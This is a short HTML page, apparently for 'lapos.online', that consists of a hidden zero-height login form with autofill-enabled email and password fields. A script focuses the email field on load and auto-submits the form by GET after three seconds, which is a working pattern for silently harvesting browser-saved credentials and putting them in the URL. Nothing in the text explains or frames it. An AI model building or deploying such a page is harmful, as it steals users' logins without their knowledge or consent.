<!DOCTYPE html>
<html>

<head>
	<title>lapos.online</title>
</head>
<body>
<form method="GET" action="https://lapos.online/login" autocomplete="on" style="height: 0 !important;">
<input id="email" type="email" class="form-control" name="email" autofocus autocomplete="email">
<input id="password" type="password" class="form-control" name="password" autocomplete="password">
<button type="submit" id="form-login">Login</button>
</form>
	
<script>
	window.onload = (event) => {
		document.getElementById("email").click();
		document.getElementById("email").focus();
		document.getElementById("email").select();
	  	setTimeout(function() {
		  	document.getElementById("form-login").click();
		}, 3000);
	};
</script>
</body>
</html>
